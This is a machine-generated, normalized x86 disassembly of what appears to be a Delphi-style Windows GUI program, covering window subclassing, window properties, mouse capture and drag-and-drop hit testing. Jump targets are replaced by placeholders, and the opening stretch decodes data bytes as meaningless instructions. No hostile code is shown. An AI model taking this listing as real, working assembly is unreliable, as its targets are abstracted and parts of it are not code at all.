add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x72440c00
popad
ja r-xdata
jae r-xdata
outsb
push ebx
je r-xdata
cmp [ eax + 0x43 ] ah
mov [ fs : 0x600041 ] dl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
insb
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
sbb [ edi + 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x44a29874
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ ecx ] cl
dec ecx
insd
popad
push esp
jns r-xdata
out 0xc1 eax
add [ eax ] al
add eax 0xffffff8c
jmp sub_446328
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x280043 ] ah
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
add [ eax ] al
call esp
cmpsb [ esi ] [ edi ]
add [ gs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
inc ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] al
push es
dec ebp
popad
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
adc [ eax ] al
xor al 0x0
add bh bh
aam 0xa6
sub_43a224
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43a2dc
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43a310
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043b8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43a2dc
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43a36c
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43a550
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c384
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404418
mov eax edi
mov edx esi
call sub_403f4c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a594
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c384
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404418
mov eax edi
mov edx esi
call sub_403f4c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a5d8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43e62c
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43a654
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov eax ebx
call sub_443c60
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43a69c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_43a700
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_414108
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43a734
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443c60
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43a75c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026e4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43a734
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43a700
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413fac
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_414184
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a7b8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413fe0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414108
mov edx 0x8
call sub_402704
inc esi
dec ebx
jne r-xdata
sub_43a7ec
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_414108
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43a700
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43a850
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43a8b0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403074
mov edx esp
mov eax esi
call sub_40415c
add esp 0x100
pop esi
pop ebx
retn
sub_43a8ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a9b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43ba0c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43b394
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406948
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43b394
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43ba0c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43b394
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43ba0c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43a9bb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43ba0c
sub_43aa14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43aa3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43aaa4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a850
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43aad0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403320
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43aafc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403320
xor edx edx
sub_43ab54
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_445814
sub_43ab74
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4457fc
sub_43ab98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43aa80
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e4a4
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_425100
mov edx eax
mov eax esi
call sub_41e620
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43abfc
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_43ac2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43aaa4
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43ac88
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403320
pop edi
pop esi
pop ebp
retn 0x4
sub_43acac
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43acd0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43acac
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43acac
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43ad8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43adf8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43b248
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43a310
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_443c60
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_443c60
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443c60
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403320
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43ad8c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_443c60
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_443c60
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43af90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_443c60
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443c60
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43afd4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43a7ec
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43adf8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_414108
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_443c60
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43af90
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403320
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_442790
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43a75c
sub_43b130
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_414164
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413ff8
mov edx edi
mov eax [ rw-data ]
call sub_413fac
jmp r-xdata
sub_43b190
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43b1e8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043b8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43a2dc
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43b248
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43b1e8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43b274
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43afd4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43b248
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43b190
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_443c60
mov [ esi ] eax
sub_43b2c4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43b190
cmp eax 0x1
sbb eax eax
inc eax
sub_43b300
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_4426fc
test eax eax
je r-xdata
mov eax esi
call sub_4426fc
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43bd30
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_414108
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_414164
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_442710
mov edi eax
jmp r-xdata
sub_43b394
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43b274
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
